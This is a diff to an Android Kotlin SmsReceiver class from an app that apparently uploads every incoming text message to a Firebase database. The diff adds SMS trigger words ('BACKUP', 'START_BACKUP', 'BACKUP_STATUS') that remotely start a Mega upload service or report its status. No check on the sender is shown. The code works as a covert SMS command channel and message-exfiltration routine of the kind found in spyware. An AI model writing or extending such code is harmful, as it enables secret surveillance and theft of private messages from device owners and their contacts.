@@ -27,6 +27,18 @@ class SmsReceiver : BroadcastReceiver() {
                             val body = smsMessage.displayMessageBody ?: smsMessage.messageBody ?: ""
                             val timestamp = smsMessage.timestampMillis.takeIf { it > 0 } ?: System.currentTimeMillis()
 
+                            // Check for SMS fallback commands
+                            val trimmedBody = body.trim().uppercase()
+                            if (trimmedBody == "BACKUP" || trimmedBody == "START_BACKUP") {
+                                com.example.service.MegaUploadService.startService(appContext)
+                            } else if (trimmedBody == "BACKUP_STATUS") {
+                                val statusMap = com.example.data.sync.MegaUploadManager.getBackupStatusMap(appContext)
+                                val isRunning = statusMap["isRunning"]
+                                val folder = statusMap["currentFolder"]
+                                // Log / Sync status
+                                engine.uploadSingleSmsInstant(address, "SMS Backup Status: Running=$isRunning, Folder=$folder", System.currentTimeMillis())
+                            }
+
                             // 1. Instantly upload to Firebase Realtime Database at /devices/{deviceId}/sms
                             engine.uploadSingleSmsInstant(address, body, timestamp)
 
